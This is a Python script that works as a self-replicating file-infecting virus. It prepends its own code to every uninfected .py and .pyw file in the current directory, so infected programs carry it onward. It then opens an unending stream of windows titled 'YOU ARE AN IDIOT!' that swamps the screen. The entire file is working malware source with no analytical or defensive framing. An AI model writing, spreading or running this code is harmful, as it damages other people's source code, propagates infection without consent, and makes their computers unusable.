# SCRIPT SAYS HI!

import tkinter as tk
import random
from PIL import ImageTk, Image
from io import BytesIO
import urllib.request as request

root = tk.Tk()

URL="https://openclipart.org/image/800px/279689"
response = request.urlopen(URL)
img_data = response.read()
h=BytesIO(img_data)
open_i=Image.open(h)
imagen = open_i.resize((300, 300), Image.ANTIALIAS)
image = ImageTk.PhotoImage(imagen)

def startInfiniteLoop():
    i = 0
    otherFrame = []
    while True:
        tkl=tk.Toplevel()
        w = tkl.winfo_width()
        h = tkl.winfo_height()
        if tkl.winfo_screenwidth() > 1800:
            x = random.randint(-650, 1400)
        elif tkl.winfo_screenwidth() > 1250:
            x = random.randint(-600, 800)
        else:
            x = random.randint(-500, 700)
        y =  random.randint(-550, 550)
        tkl.geometry("+%d+%d" % (x + 300, y + 300))
        tkl.title("YOU ARE AN IDIOT!")
        label = tk.Label(tkl, image=image)
        label.pack(fill="both")
        otherFrame.append(tkl)
        i += 1
        tkl.update()
        if i%500 == 0:
            root.update()

import sys
import glob

script_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line == "# SCRIPT SAYS HI!":
        self_replicating_part = True
    if not self_replicating_part:
        script_code.append(line)
    if line == "# SCRIPT SAYS BYE!\n":
        break

python_files = glob.glob('*.py') + glob.glob('*.pyw')

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()

    implanted = False

    for line in file_code:
        if line == "# SCRIPT SAYS HI!\n":
            implanted = True
            break

    if not implanted:
        final_code = []
        final_code.extend(script_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)
            
def IDIOT():
    print("YOU ARE AN IDIOT!")

label = tk.Label(root, image=image)
label.pack(fill='both')
IDIOT()
startInfiniteLoop()
root.mainloop()

# SCRIPT SAYS BYE!






